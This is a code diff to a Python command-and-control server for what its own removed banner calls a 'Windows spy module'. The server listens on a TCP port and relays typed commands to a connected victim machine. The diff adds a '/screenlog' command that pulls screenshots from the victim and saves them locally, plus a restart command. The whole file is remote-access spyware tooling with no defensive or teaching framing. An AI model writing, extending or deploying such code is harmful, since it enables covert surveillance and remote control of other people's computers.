@@ -1,14 +1,15 @@
 import socket, os, threading, random
+from PIL import Image
 from termcolor import colored
 from random import randint
 
-IP = "192.168.0.3"
+IP = "192.168.0.15"
 PORT = 6667
 BUFFER = 1024
 
 os.system("cls")
 
-choice_LOGO = randint(1, 4)
+choice_LOGO = randint(1, 3)
 
 logo1 = """
     Art by: Hayley Jane Wakenshaw
@@ -28,18 +29,6 @@ logo2 = """
 """
 
 logo3 = """
-    art by: Argiris A. Kranidiotis
-     ____________________________
-    /                           /\
-   /    Windows spy module    _/ /\
-  /                          / \/
- /                           /\
-/___________________________/ /
-\___________________________\/
- \ \ \ \ \ \ \ \ \ \ \ \ \ \ \
-"""
-
-logo4 = """
     Art by Joan G. Stark
     ___
     \_/
@@ -62,15 +51,16 @@ if(choice_LOGO == 2):
     print(logo2)
 if(choice_LOGO == 3):
     print(logo3)
-if(choice_LOGO == 4):
-    print(logo4)
+
 
 
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
 server.bind((IP, PORT))
+dir_path = os.path.dirname(os.path.realpath(__file__))
 print(colored("server runing on ip:{0} and port:{1}".format(IP,PORT), "green"))
+print(colored(f"path to server: {dir_path}","yellow"))
 print(colored("\n to send server commands type: /[command]}","red"))
 server.listen(10)
 conn, addr = server.accept()
@@ -83,14 +73,20 @@ if conn:
             break
         if cmd == "/stay":
             print(colored("[/] await the pc start!", "yellow"))
-        #if cmd == "/screenlog":
-        #    print("[-] awaiting data ...")
-        #    filename = conn.recv(BUFFER).decode("utf-8")
-        #    with open(filename, "wb") as f:
-        #        data = conn.recv(BUFFER)
-        #        if not data:
-        #            break
-        #        f.write(data)
+        if cmd == "/root":
+            print(colored("[-]","red") + "server restating")
+            os.system(f'python3 {dir_path}/server.py')
+        if cmd == "/screenlog":
+            conn.send(cmd.encode("utf-8"))
+            print(colored("[/]","yellow"), "awaitng data ...")
+            size = int(conn.recv(10).decode('utf-8'))
+            print(size)
+
+            img = conn.recv(size)
+            print(img)
+            img_to_save = Image.frombytes("RGB", (1920, 1080), img)
+            img_to_save.save("screenshot.png")
+            print(colored("[+]","green"), "foto recived")
             
         conn.send((cmd).encode('utf-8'))
         output = conn.recv(BUFFER).decode('utf-8')
